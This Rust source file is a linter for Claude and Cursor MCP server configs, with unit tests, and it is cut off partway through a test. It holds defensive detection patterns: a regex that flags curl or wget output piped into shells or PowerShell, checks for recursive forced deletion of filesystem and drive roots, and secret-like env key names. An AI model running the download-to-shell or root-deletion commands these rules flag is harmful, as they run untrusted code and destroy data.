use crate::config::ExcludeSet;
use crate::context::{LintContext, ManifestState};
use crate::diagnostic::{DiagnosticCollector, DiagnosticMetadata, SourceSpan};
use crate::platforms::ValidationTargets;
use crate::rules::LintRule;
use crate::traversal;
use crate::validators::common::is_nonlocal_url_with_scheme;
use regex::Regex;
use serde_json::Value;
use std::collections::HashSet;
use std::path::Path;
use std::sync::LazyLock;

const RESERVED_SERVER_NAMES: &[&str] = &["workspace"];

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
enum McpTransport {
    Stdio,
    Http,
    StreamableHttp,
    Sse,
    WebSocket,
}

impl McpTransport {
    const ACCEPTED_TYPES: &str = "'stdio', 'http', 'streamable-http', 'sse', or 'ws'";

    fn parse(value: Option<&Value>) -> Option<Self> {
        match value {
            None => Some(Self::Stdio),
            Some(Value::String(kind)) => match kind.as_str() {
                "stdio" => Some(Self::Stdio),
                "http" => Some(Self::Http),
                "streamable-http" => Some(Self::StreamableHttp),
                "sse" => Some(Self::Sse),
                "ws" => Some(Self::WebSocket),
                _ => None,
            },
            Some(_) => None,
        }
    }

    fn is_remote(self) -> bool {
        !matches!(self, Self::Stdio)
    }

    fn name(self) -> &'static str {
        match self {
            Self::Stdio => "stdio",
            Self::Http => "http",
            Self::StreamableHttp => "streamable-http",
            Self::Sse => "sse",
            Self::WebSocket => "ws",
        }
    }

    fn accepts_url(self, value: &str) -> bool {
        let Ok(url) = url::Url::parse(value) else {
            return false;
        };
        let scheme_is_appropriate = match self {
            Self::Http | Self::StreamableHttp | Self::Sse => {
                matches!(url.scheme(), "http" | "https")
            }
            Self::WebSocket => matches!(url.scheme(), "ws" | "wss"),
            Self::Stdio => return true,
        };
        scheme_is_appropriate && url.host().is_some()
    }

    fn url_scheme_description(self) -> &'static str {
        match self {
            Self::Http | Self::StreamableHttp | Self::Sse => "http:// or https://",
            Self::WebSocket => "ws:// or wss://",
            Self::Stdio => unreachable!("stdio does not accept a remote URL"),
        }
    }
}

static RE_CLAUDE_ENV_EXPANSION: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\$\{([A-Za-z_][A-Za-z0-9_]*)(?::-([^}]*))?\}$")
        .expect("valid Claude env-expansion regex")
});
static RE_PAYLOAD_DOWNLOAD_PIPE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)\b(?:curl|wget|invoke-webrequest|iwr)\b[^|\n]*\|\s*(?:(?:ba)?sh|dash|zsh|ksh|csh|tcsh|fish|cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh(?:\.exe)?|iex|invoke-expression)\b",
    )
    .expect("valid download-pipe regex")
});

const UNIX_SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "csh", "tcsh", "fish"];
const SENSITIVE_SEGMENTS: &[&str] = &["SECRET", "TOKEN", "PASSWORD", "PASSWD"];
const SENSITIVE_SEGMENT_PAIRS: &[&[&str]] = &[
    &["PRIVATE", "KEY"],
    &["ACCESS", "KEY"],
    &["API", "KEY"],
    &["CLIENT", "SECRET"],
];

#[derive(Clone, Copy, Debug, Eq, Ord, PartialEq, PartialOrd)]
enum DangerousThreat {
    // Declaration order is priority: lower discriminant wins when multiple match.
    DownloadPipedToShell,
    DestructiveRm,
    DestructiveRd,
}

impl DangerousThreat {
    fn evidence(self) -> &'static str {
        match self {
            Self::DownloadPipedToShell => "download-piped-to-shell",
            Self::DestructiveRm => "destructive-rm",
            Self::DestructiveRd => "destructive-rd",
        }
    }

    fn suggestion(self) -> &'static str {
        match self {
            Self::DownloadPipedToShell => {
                "launch via argv without a shell -c/-Command payload that pipes downloads into an interpreter"
            }
            Self::DestructiveRm => {
                "do not invoke rm with recursive+force against the filesystem root"
            }
            Self::DestructiveRd => {
                "do not invoke rd/rmdir with /s /q against a drive or filesystem root"
            }
        }
    }
}

#[derive(Clone, Copy)]
enum McpAdapter {
    ClaudeStandalone,
    ClaudeInlinePlugin,
    Cursor,
}

impl McpAdapter {
    fn requires_server_map(self) -> bool {
        !matches!(self, Self::ClaudeInlinePlugin)
    }

    fn allows_claude_transport_rules(self) -> bool {
        matches!(self, Self::ClaudeStandalone | Self::ClaudeInlinePlugin)
    }

    fn allows_claude_only_rules(self) -> bool {
        self.allows_claude_transport_rules()
    }
}

/// Validate MCP configuration through explicit adapters for the supported
/// Claude and Cursor repository surfaces. Codex TOML remains CX-owned.
pub fn validate_mcp_configs(
    ctx: &LintContext,
    diag: &mut DiagnosticCollector,
    exclude: &ExcludeSet,
    targets: ValidationTargets,
) {
    for path in claude_mcp_config_paths(ctx) {
        validate_json_document(
            &path,
            McpAdapter::ClaudeStandalone,
            &ctx.base_path,
            diag,
            exclude,
        );
    }

    if targets.cursor {
        validate_json_document(
            &ctx.base_path.join(".cursor/mcp.json"),
            McpAdapter::Cursor,
            &ctx.base_path,
            diag,
            exclude,
        );
    }

    if let ManifestState::Parsed(value) = &ctx.plugin_json {
        let display = ".claude-plugin/plugin.json";
        if !exclude.is_excluded(display) {
            diag.with_subject_path(display, |diag| {
                validate_document(display, value, McpAdapter::ClaudeInlinePlugin, None, diag);
            });
        }
    }
}

fn validate_json_document(
    path: &Path,
    adapter: McpAdapter,
    base_path: &Path,
    diag: &mut DiagnosticCollector,
    exclude: &ExcludeSet,
) {
    if !path.is_file() {
        return;
    }
    let display = display_path(base_path, path);
    if exclude.is_excluded(&display) {
        return;
    }
    let content = match std::fs::read_to_string(path) {
        Ok(content) => content,
        Err(error) => {
            diag.report_at(
                LintRule::McpJsonInvalid,
                &display,
                &format!("{display} cannot be read: {error}"),
            );
            return;
        }
    };
    let value: Value = match serde_json::from_str(&content) {
        Ok(value) => value,
        Err(error) => {
            diag.report_at(
                LintRule::McpJsonInvalid,
                &display,
                &format!("{display} is not valid JSON: {error}"),
            );
            return;
        }
    };
    let raw_keys = scan_mcp_keys(&content);
    diag.with_subject_path(&display, |diag| {
        validate_document(&display, &value, adapter, Some((&content, &raw_keys)), diag);
    });
}

fn claude_mcp_config_paths(ctx: &LintContext) -> Vec<std::path::PathBuf> {
    let mut paths = Vec::new();
    for entry in traversal::recursive_files(&ctx.base_path, &ctx.base_path, None).entries {
        if entry.path.file_name().and_then(|name| name.to_str()) == Some(".mcp.json") {
            paths.push(entry.path);
        }
    }
    paths.sort();
    paths
}

fn display_path(base: &Path, path: &Path) -> String {
    path.strip_prefix(base)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

fn validate_document(
    display: &str,
    value: &Value,
    adapter: McpAdapter,
    raw_document: Option<(&str, &RawMcpKeys)>,
    diag: &mut DiagnosticCollector,
) {
    if let Some((source, raw_keys)) = raw_document {
        for duplicate in raw_keys.server_maps.iter().skip(1) {
            report_structure(
                diag,
                &format!("{display}: duplicate top-level mcpServers key"),
                Some((source, duplicate.key_range.clone())),
                None,
            );
        }
        if let Some(first) = raw_keys.server_maps.first()
            && !first.value_is_object
        {
            report_structure(
                diag,
                &format!("{display}: mcpServers must be an object"),
                Some((source, first.value_range.clone())),
                None,
            );
        }
        for map in &raw_keys.server_maps {
            for entry in &raw_keys.server_entries[map.entries.clone()] {
                if !entry.value_is_object {
                    report_structure(
                        diag,
                        &format!("{display}: mcpServers.{} must be an object", entry.name),
                        Some((source, entry.value_range.clone())),
                        None,
                    );
                }
            }
        }
        for duplicate in &raw_keys.server_names {
            diag.report(
                LintRule::McpDuplicateServer,
                &format!(
                    "{display}: mcpServers contains duplicate server name '{}'",
                    duplicate.name
                ),
            );
        }
    }

    let servers = value.get("mcpServers");
    if servers.is_none() && !adapter.requires_server_map() {
        return;
    }
    let Some(servers) = servers.and_then(Value::as_object) else {
        let has_duplicate_map =
            raw_document.is_some_and(|(_, raw_keys)| raw_keys.server_maps.len() > 1);
        let first_invalid_map = raw_document.is_some_and(|(_, raw_keys)| {
            raw_keys
                .server_maps
                .first()
                .is_some_and(|map| !map.value_is_object)
        });
        if !has_duplicate_map && !first_invalid_map {
            let location = raw_document.and_then(|(source, raw_keys)| {
                raw_keys
                    .server_maps
                    .last()
                    .map(|map| (source, map.value_range.clone()))
            });
            report_structure(
                diag,
                &format!("{display}: mcpServers must be an object"),
                location,
                servers
                    .is_none()
                    .then_some("add a top-level mcpServers object"),
            );
        }
        return;
    };

    for (name, config) in servers {
        let label = format!("{display}: mcpServers.{name}");
        if adapter.allows_claude_only_rules() && RESERVED_SERVER_NAMES.contains(&name.as_str()) {
            diag.report(
                LintRule::McpServerReserved,
                &format!("{label} uses reserved server name '{name}'"),
            );
        }
        let Some(config) = config.as_object() else {
            if raw_document.is_none() {
                diag.report(
                    LintRule::McpStructureInvalid,
                    &format!("{label} must be an object"),
                );
            }
            continue;
        };
        if config.is_empty() {
            diag.report(
                LintRule::McpServerEmpty,
                &format!("{label} must not be an empty object"),
            );
            continue;
        }

        if adapter.allows_claude_transport_rules() {
            validate_claude_transport(&label, config, diag);
        } else {
            validate_cursor_selector(&label, config, diag);
        }
        if let Some(args) = config.get("args")
            && !args
                .as_array()
                .is_some_and(|items| items.iter().all(Value::is_string))
        {
            diag.report(
                LintRule::McpArgsInvalid,
                &format!("{label}.args must be an array of strings"),
            );
        }
        if adapter.allows_claude_only_rules()
            && config
                .get("alwaysLoad")
                .is_some_and(|value| !value.is_boolean())
        {
            diag.report(
                LintRule::McpAlwaysLoadInvalid,
                &format!("{label}.alwaysLoad must be a boolean"),
            );
        }
        report_literal_secrets(
            &label,
            config.get("env"),
            adapter.allows_claude_transport_rules(),
            diag,
        );
        if let Some(threat) = dangerous_command_threat(config) {
            diag.report_with(
                LintRule::McpCommandDangerous,
                &format!("{label} uses a dangerous command pattern"),
                DiagnosticMetadata::default()
                    .with_evidence(threat.evidence())
                    .with_suggestion(threat.suggestion()),
            );
        }
    }
}

fn report_structure(
    diag: &mut DiagnosticCollector,
    message: &str,
    location: Option<(&str, std::ops::Range<usize>)>,
    suggestion: Option<&str>,
) {
    let mut metadata = DiagnosticMetadata::default();
    if let Some((source, range)) = location {
        if let Some(span) = SourceSpan::from_byte_range(source, range) {
            metadata = metadata.with_location(span);
        }
    }
    if let Some(suggestion) = suggestion {
        metadata = metadata.with_suggestion(suggestion);
    }
    diag.report_with(LintRule::McpStructureInvalid, message, metadata);
}

fn validate_claude_transport(
    label: &str,
    config: &serde_json::Map<String, Value>,
    diag: &mut DiagnosticCollector,
) {
    let transport = McpTransport::parse(config.get("type"));
    let Some(transport) = transport else {
        diag.report(
            LintRule::McpTypeInvalid,
            &format!("{label}.type must be {}", McpTransport::ACCEPTED_TYPES),
        );
        return;
    };
    if transport == McpTransport::Stdio && !has_nonempty_string(config.get("command")) {
        diag.report(
            LintRule::McpStdioCommandMissing,
            &format!("{label}: stdio server requires a non-empty command"),
        );
    }
    if transport.is_remote() {
        match config.get("url").and_then(Value::as_str) {
            Some(url) if transport.accepts_url(url) => validate_url_security(label, url, diag),
            _ => diag.report(
                LintRule::McpHttpUrlMissing,
                &format!(
                    "{label}: {} server requires a valid non-empty URL using {}",
                    transport.name(),
                    transport.url_scheme_description(),
                ),
            ),
        }
    }
    if transport == McpTransport::Sse {
        diag.report(
            LintRule::McpSseDeprecated,
            &format!("{label}: SSE transport is deprecated; use Streamable HTTP"),
        );
    }
}

fn validate_cursor_selector(
    label: &str,
    config: &serde_json::Map<String, Value>,
    diag: &mut DiagnosticCollector,
) {
    match (config.contains_key("command"), config.contains_key("url")) {
        (false, false) | (true, true) => diag.report(
            LintRule::McpStructureInvalid,
            &format!("{label} must define exactly one of command or url"),
        ),
        (false, true) => {
            if let Some(url) = config.get("url").and_then(Value::as_str) {
                validate_url_security(label, url, diag);
            }
        }
        (true, false) => {}
    }
}

fn validate_url_security(label: &str, url: &str, diag: &mut DiagnosticCollector) {
    for (insecure_scheme, secure_scheme) in [("http", "https"), ("ws", "wss")] {
        if is_nonlocal_url_with_scheme(url, insecure_scheme) {
            diag.report(
                LintRule::McpUrlNotHttps,
                &format!("{label}.url uses non-local {insecure_scheme}://; use {secure_scheme}://"),
            );
        }
    }
}

fn has_nonempty_string(value: Option<&Value>) -> bool {
    value
        .and_then(Value::as_str)
        .is_some_and(|value| !value.trim().is_empty())
}

fn report_literal_secrets(
    label: &str,
    env: Option<&Value>,
    allow_claude_expansion: bool,
    diag: &mut DiagnosticCollector,
) {
    let Some(env) = env.and_then(Value::as_object) else {
        return;
    };
    // serde_json::Map is BTreeMap-backed here, so iteration is already key-ordered.
    for (key, value) in env {
        if !is_sensitive_env_key(key) {
            continue;
        }
        let Some(raw) = value.as_str() else {
            continue;
        };
        if raw.trim().is_empty() {
            continue;
        }
        if allow_claude_expansion && is_safe_claude_env_reference(raw) {
            continue;
        }
        let suggestion = if allow_claude_expansion {
            format!(
                "use ${{{key}}} environment expansion; never store the secret value in MCP config"
            )
        } else {
            "set the secret in the process environment instead of storing it in MCP config"
                .to_string()
        };
        diag.report_with(
            LintRule::McpEnvSecretLiteral,
            &format!("{label}.env.{key} contains a literal secret-like value"),
            DiagnosticMetadata::default()
                .with_evidence(key.as_str())
                .with_suggestion(suggestion),
        );
    }
}

fn is_sensitive_env_key(key: &str) -> bool {
    let segments: Vec<String> = key
        .split(|ch: char| !ch.is_ascii_alphanumeric())
        .filter(|segment| !segment.is_empty())
        .map(|segment| segment.to_ascii_uppercase())
        .collect();
    if segments
        .iter()
        .any(|segment| SENSITIVE_SEGMENTS.iter().any(|needle| segment == needle))
    {
        return true;
    }
    segments.windows(2).any(|window| {
        SENSITIVE_SEGMENT_PAIRS
            .iter()
            .any(|pair| window[0] == pair[0] && window[1] == pair[1])
    })
}

fn is_safe_claude_env_reference(value: &str) -> bool {
    let Some(captures) = RE_CLAUDE_ENV_EXPANSION.captures(value) else {
        return false;
    };
    match captures.get(2) {
        None => true,                   // exact ${NAME}
        Some(default) => default.as_str().is_empty(), // ${NAME:-} with empty default
    }
}

fn dangerous_command_threat(config: &serde_json::Map<String, Value>) -> Option<DangerousThreat> {
    let command = config.get("command").and_then(Value::as_str)?;
    if command.trim().is_empty() {
        return None;
    }
    let args: Vec<&str> = config
        .get("args")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
        .collect();
    let basename = executable_basename(command);

    let mut best: Option<DangerousThreat> = None;

    if let Some(payload) = interpreter_payload(&basename, &args) {
        match payload {
            InterpreterPayload::Plain(text) => {
                consider_payload_threats(&mut best, text);
            }
            InterpreterPayload::PowerShellEncoded(text) => {
                if let Some(decoded) = decode_powershell_encoded(text) {
                    consider_payload_threats(&mut best, &decoded);
                }
            }
        }
    }

    if is_destructive_rm(&basename, &args) {
        prefer_threat(&mut best, DangerousThreat::DestructiveRm);
    }
    if basename == "sudo"
        && let Some(rm_index) = args.iter().position(|arg| executable_basename(arg) == "rm")
        && is_destructive_rm("rm", &args[rm_index + 1..])
    {
        prefer_threat(&mut best, DangerousThreat::DestructiveRm);
    }
    if is_destructive_rd(&basename, &args) {
        prefer_threat(&mut best, DangerousThreat::DestructiveRd);
    }

    best
}

fn prefer_threat(best: &mut Option<DangerousThreat>, threat: DangerousThreat) {
    if best.is_none_or(|current| threat < current) {
        *best = Some(threat);
    }
}

fn consider_payload_threats(best: &mut Option<DangerousThreat>, payload: &str) {
    if RE_PAYLOAD_DOWNLOAD_PIPE.is_match(payload) {
        prefer_threat(best, DangerousThreat::DownloadPipedToShell);
    }
    if payload_has_destructive_rm(payload) {
        prefer_threat(best, DangerousThreat::DestructiveRm);
    }
    if payload_has_destructive_rd(payload) {
        prefer_threat(best, DangerousThreat::DestructiveRd);
    }
}

fn payload_command_segments(payload: &str) -> impl Iterator<Item = Vec<&str>> + '_ {
    payload
        .split([';', '|', '&', '\n', '\r'])
        .map(|segment| segment.split_whitespace().collect())
        .filter(|tokens: &Vec<&str>| !tokens.is_empty())
}

fn payload_has_destructive_rm(payload: &str) -> bool {
    for tokens in payload_command_segments(payload) {
        let basename = executable_basename(tokens[0]);
        if is_destructive_rm(&basename, &tokens[1..]) {
            return true;
        }
        if basename == "sudo"
            && let Some(rm_index) = tokens[1..]
                .iter()
                .position(|token| executable_basename(token) == "rm")
        {
            let rm_abs = rm_index + 1;
            if is_destructive_rm("rm", &tokens[rm_abs + 1..]) {
                return true;
            }
        }
    }
    false
}

fn payload_has_destructive_rd(payload: &str) -> bool {
    payload_command_segments(payload).any(|tokens| {
        is_destructive_rd(&executable_basename(tokens[0]), &tokens[1..])
    })
}

fn executable_basename(command: &str) -> String {
    let name = Path::new(command)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or(command);
    let lower = name.to_ascii_lowercase();
    for ext in [".exe", ".cmd", ".bat"] {
        if let Some(stripped) = lower.strip_suffix(ext) {
            return stripped.to_string();
        }
    }
    lower
}

enum InterpreterPayload<'a> {
    Plain(&'a str),
    PowerShellEncoded(&'a str),
}

fn interpreter_payload<'a>(basename: &str, args: &[&'a str]) -> Option<InterpreterPayload<'a>> {
    if UNIX_SHELLS.contains(&basename) {
        return unix_shell_c_payload(args).map(InterpreterPayload::Plain);
    }
    if basename == "cmd" {
        return windows_cmd_payload(args).map(InterpreterPayload::Plain);
    }
    if basename == "powershell" || basename == "pwsh" {
        return powershell_payload(args);
    }
    None
}

fn unix_shell_c_payload<'a>(args: &[&'a str]) -> Option<&'a str> {
    let mut index = 0;
    while index < args.len() {
        let arg = args[index];
        if arg == "--" {
            return None;
        }
        if arg == "-c" {
            return args.get(index + 1).copied();
        }
        if arg.starts_with('-') && !arg.starts_with("--") {
            // Combined short options such as -ec / -lc supply -c.
            if arg.as_bytes().iter().skip(1).any(|&byte| byte == b'c') {
                return args.get(index + 1).copied();
            }
        }
        index += 1;
    }
    None
}

fn windows_cmd_payload<'a>(args: &[&'a str]) -> Option<&'a str> {
    for (index, arg) in args.iter().enumerate() {
        if arg.eq_ignore_ascii_case("/c") || arg.eq_ignore_ascii_case("/k") {
            return args.get(index + 1).copied();
        }
    }
    None
}

fn powershell_payload<'a>(args: &[&'a str]) -> Option<InterpreterPayload<'a>> {
    for (index, arg) in args.iter().enumerate() {
        match powershell_command_flag(arg) {
            Some(PowerShellFlag::Encoded) => {
                return args
                    .get(index + 1)
                    .copied()
                    .map(InterpreterPayload::PowerShellEncoded);
            }
            Some(PowerShellFlag::Plain) => {
                return args
                    .get(index + 1)
                    .copied()
                    .map(InterpreterPayload::Plain);
            }
            None => {}
        }
    }
    None
}

#[derive(Clone, Copy)]
enum PowerShellFlag {
    Plain,
    Encoded,
}

fn powershell_command_flag(arg: &str) -> Option<PowerShellFlag> {
    let trimmed = arg.trim_start_matches('-');
    if trimmed.is_empty() || trimmed == arg {
        return None;
    }
    let lower = trimmed.to_ascii_lowercase();
    match lower.as_str() {
        "command" | "c" | "commandwithargs" => Some(PowerShellFlag::Plain),
        "encodedcommand" | "e" | "ec" => Some(PowerShellFlag::Encoded),
        _ => None,
    }
}

fn decode_powershell_encoded(payload: &str) -> Option<String> {
    let bytes = decode_base64_std(payload.trim())?;
    if bytes.len() >= 2 && bytes.len() % 2 == 0 {
        let utf16: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect();
        if let Ok(decoded) = String::from_utf16(&utf16) {
            return Some(decoded);
        }
    }
    String::from_utf8(bytes).ok()
}

fn decode_base64_std(input: &str) -> Option<Vec<u8>> {
    fn value(byte: u8) -> Option<u8> {
        match byte {
            b'A'..=b'Z' => Some(byte - b'A'),
            b'a'..=b'z' => Some(byte - b'a' + 26),
            b'0'..=b'9' => Some(byte - b'0' + 52),
            b'+' => Some(62),
            b'/' => Some(63),
            _ => None,
        }
    }

    let filtered: Vec<u8> = input
        .bytes()
        .filter(|byte| !byte.is_ascii_whitespace())
        .collect();
    if filtered.is_empty() || filtered.len() % 4 != 0 {
        return None;
    }
    let mut output = Vec::with_capacity(filtered.len() / 4 * 3);
    for chunk in filtered.chunks_exact(4) {
        let padding = chunk.iter().rev().take_while(|&&byte| byte == b'=').count();
        if padding > 2 {
            return None;
        }
        let mut values = [0u8; 4];
        for (index, &byte) in chunk.iter().enumerate() {
            if byte == b'=' {
                if index < 4 - padding {
                    return None;
                }
                values[index] = 0;
            } else {
                values[index] = value(byte)?;
            }
        }
        output.push((values[0] << 2) | (values[1] >> 4));
        if padding < 2 {
            output.push((values[1] << 4) | (values[2] >> 2));
        }
        if padding < 1 {
            output.push((values[2] << 6) | values[3]);
        }
    }
    Some(output)
}

fn is_destructive_rm(basename: &str, args: &[&str]) -> bool {
    if basename != "rm" {
        return false;
    }
    let mut recursive = false;
    let mut force = false;
    let mut end_of_options = false;
    let mut targets_root = false;
    for arg in args {
        if !end_of_options && *arg == "--" {
            end_of_options = true;
            continue;
        }
        if !end_of_options && arg.starts_with('-') && *arg != "-" {
            if *arg == "--recursive" {
                recursive = true;
                continue;
            }
            if *arg == "--force" {
                force = true;
                continue;
            }
            if arg.starts_with("--") {
                continue;
            }
            for flag in arg.chars().skip(1) {
                match flag {
                    'r' | 'R' => recursive = true,
                    'f' => force = true,
                    _ => {}
                }
            }
            continue;
        }
        if *arg == "/" {
            targets_root = true;
        }
    }
    recursive && force && targets_root
}

fn is_destructive_rd(basename: &str, args: &[&str]) -> bool {
    if basename != "rd" && basename != "rmdir" {
        return false;
    }
    let mut recursive = false;
    let mut quiet = false;
    let mut targets_root = false;
    for arg in args {
        if arg.eq_ignore_ascii_case("/s") {
            recursive = true;
            continue;
        }
        if arg.eq_ignore_ascii_case("/q") {
            quiet = true;
            continue;
        }
        // Combined /s /q forms like /sq are uncommon; accept /s and /q only as separate tokens.
        if is_windows_drive_root(arg) {
            targets_root = true;
        }
    }
    recursive && quiet && targets_root
}

fn is_windows_drive_root(path: &str) -> bool {
    matches!(path, "\\" | "/")
        || (path.len() == 2
            && path.as_bytes()[0].is_ascii_alphabetic()
            && path.as_bytes()[1] == b':')
        || (path.len() == 3
            && path.as_bytes()[0].is_ascii_alphabetic()
            && path.as_bytes()[1] == b':'
            && matches!(path.as_bytes()[2], b'\\' | b'/'))
}



/// Serde intentionally keeps only the last duplicate key. This scanner runs
/// after parsing succeeds so P023/P027 retain raw-key identity and spans.
struct RawMcpKeys {
    server_maps: Vec<RawServerMap>,
    server_entries: Vec<RawServerEntry>,
    server_names: Vec<DuplicateServerName>,
}

struct RawServerMap {
    key_range: std::ops::Range<usize>,
    value_range: std::ops::Range<usize>,
    value_is_object: bool,
    entries: std::ops::Range<usize>,
}

struct RawServerEntry {
    name: String,
    value_range: std::ops::Range<usize>,
    value_is_object: bool,
}

struct DuplicateServerName {
    name: String,
}

fn scan_mcp_keys(content: &str) -> RawMcpKeys {
    let mut scanner = JsonScanner::new(content.as_bytes());
    scanner.scan_value(ScanObject::TopLevel);
    RawMcpKeys {
        server_maps: scanner.server_maps,
        server_entries: scanner.server_entries,
        server_names: scanner.server_names,
    }
}

#[derive(Clone, Copy)]
enum ScanObject {
    None,
    TopLevel,
    ServerMap,
}

struct JsonScanner<'a> {
    input: &'a [u8],
    pos: usize,
    server_maps: Vec<RawServerMap>,
    server_entries: Vec<RawServerEntry>,
    server_names: Vec<DuplicateServerName>,
}

impl<'a> JsonScanner<'a> {
    fn new(input: &'a [u8]) -> Self {
        Self {
            input,
            pos: 0,
            server_maps: Vec::new(),
            server_entries: Vec::new(),
            server_names: Vec::new(),
        }
    }

    fn scan_value(&mut self, object_kind: ScanObject) {
        self.skip_ws();
        match self.input.get(self.pos) {
            Some(b'{') => self.scan_object(object_kind),
            Some(b'[') => self.scan_array(),
            Some(b'\"') => {
                self.scan_string();
            }
            _ => self.scan_scalar(),
        }
    }

    fn scan_object(&mut self, object_kind: ScanObject) {
        self.pos += 1;
        let mut names = HashSet::new();
        loop {
            self.skip_ws();
            if self.input.get(self.pos) == Some(&b'}') {
                self.pos += 1;
                return;
            }
            let key_start = self.pos;
            let key = self.scan_string();
            let key_range = key_start..self.pos;
            self.skip_ws();
            self.pos += 1; // JSON was already validated, so this is ':'
            let duplicate = !names.insert(key.clone());
            if duplicate && matches!(object_kind, ScanObject::ServerMap) {
                self.server_names
                    .push(DuplicateServerName { name: key.clone() });
            }
            let child_kind = if matches!(object_kind, ScanObject::TopLevel) && key == "mcpServers" {
                ScanObject::ServerMap
            } else {
                ScanObject::None
            };
            self.skip_ws();
            let value_start = self.pos;
            let value_is_object = self.input.get(value_start) == Some(&b'{');
            let entry_start = self.server_entries.len();
            self.scan_value(child_kind);
            if matches!(object_kind, ScanObject::ServerMap) {
                self.server_entries.push(RawServerEntry {
                    name: key.clone(),
                    value_range: value_start..self.pos,
                    value_is_object,
                });
            }
            if matches!(object_kind, ScanObject::TopLevel) && key == "mcpServers" {
                self.server_maps.push(RawServerMap {
                    key_range,
                    value_range: value_start..self.pos,
                    value_is_object,
                    entries: entry_start..self.server_entries.len(),
                });
            }
            self.skip_ws();
            if self.input.get(self.pos) == Some(&b',') {
                self.pos += 1;
            }
        }
    }

    fn scan_array(&mut self) {
        self.pos += 1;
        loop {
            self.skip_ws();
            if self.input.get(self.pos) == Some(&b']') {
                self.pos += 1;
                return;
            }
            self.scan_value(ScanObject::None);
            self.skip_ws();
            if self.input.get(self.pos) == Some(&b',') {
                self.pos += 1;
            }
        }
    }

    fn scan_string(&mut self) -> String {
        let start = self.pos;
        self.pos += 1;
        while self.pos < self.input.len() {
            match self.input[self.pos] {
                b'\\' => self.pos += 2,
                b'\"' => {
                    self.pos += 1;
                    break;
                }
                _ => self.pos += 1,
            }
        }
        serde_json::from_slice(&self.input[start..self.pos]).expect("validated JSON string")
    }

    fn scan_scalar(&mut self) {
        while self.pos < self.input.len()
            && !matches!(
                self.input[self.pos],
                b',' | b']' | b'}' | b' ' | b'\n' | b'\r' | b'\t'
            )
        {
            self.pos += 1;
        }
    }

    fn skip_ws(&mut self) {
        while self.pos < self.input.len() && self.input[self.pos].is_ascii_whitespace() {
            self.pos += 1;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::context::{LintMode, ManifestState};

    fn context(base_path: &Path) -> LintContext {
        LintContext {
            base_path: base_path.to_path_buf(),
            mode: LintMode::Basic,
            plugin_json: ManifestState::Missing,
            marketplace_json: ManifestState::Missing,
            hooks_json: ManifestState::Missing,
            settings_json: ManifestState::Missing,
            settings_local_json: ManifestState::Missing,
        }
    }

    fn diagnostics(content: &str, path: &str) -> Vec<String> {
        let temp = tempfile::tempdir().unwrap();
        let file = temp.path().join(path);
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::fs::write(file, content).unwrap();
        let mut diag = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        diag.errors()
    }

    fn reported_rules(content: &str, path: &str) -> Vec<LintRule> {
        let temp = tempfile::tempdir().unwrap();
        let file = temp.path().join(path);
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::fs::write(file, content).unwrap();
        let mut diag = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        diag.diagnostics()
            .iter()
            .map(|diagnostic| diagnostic.rule)
            .collect()
    }

    #[test]
    fn validates_root_and_plugin_mcp_surfaces() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(
            temp.path().join(".mcp.json"),
            r#"{"mcpServers":{"root":{"command":"ok"}}}"#,
        )
        .unwrap();
        std::fs::create_dir_all(temp.path().join("plugins/example")).unwrap();
        std::fs::write(
            temp.path().join("plugins/example/.mcp.json"),
            r#"{"mcpServers":{"plugin":{"type":"http","url":"https://example.com"}}}"#,
        )
        .unwrap();
        let mut diag = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        assert_eq!(diag.error_count(), 0);
    }

    #[test]
    fn does_not_treat_claude_settings_as_an_mcp_surface() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::create_dir(temp.path().join(".claude")).unwrap();
        std::fs::write(temp.path().join(".claude/settings.json"), "{").unwrap();
        std::fs::write(temp.path().join(".claude/settings.local.json"), "{").unwrap();
        let mut diag = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        assert_eq!(diag.error_count(), 0);
    }

    #[test]
    fn validates_inline_plugin_servers_from_the_parsed_manifest() {
        let temp = tempfile::tempdir().unwrap();
        let ctx = LintContext {
            base_path: temp.path().to_path_buf(),
            mode: LintMode::Plugin,
            plugin_json: ManifestState::Parsed(serde_json::json!({
                "mcpServers": {
                    "missing-command": {"type": "stdio"},
                    "secret": {"command": "ok", "env": {"API_KEY": "plaintext"}}
                }
            })),
            marketplace_json: ManifestState::Missing,
            hooks_json: ManifestState::Missing,
            settings_json: ManifestState::Missing,
            settings_local_json: ManifestState::Missing,
        };
        let mut diag = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &ctx,
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        assert!(diag.diagnostics().iter().any(|diagnostic| {
            diagnostic.rule == LintRule::McpStdioCommandMissing
                && diagnostic.subject_path.as_deref()
                    == Some(Path::new(".claude-plugin/plugin.json"))
        }));
        assert!(diag.diagnostics().iter().any(|diagnostic| {
            diagnostic.rule == LintRule::McpEnvSecretLiteral
                && diagnostic.subject_path.as_deref()
                    == Some(Path::new(".claude-plugin/plugin.json"))
        }));
    }

    #[test]
    fn inline_plugin_map_is_optional_but_present_invalid_shapes_are_p027() {
        let temp = tempfile::tempdir().unwrap();
        let mut diag = DiagnosticCollector::new_all_enabled();
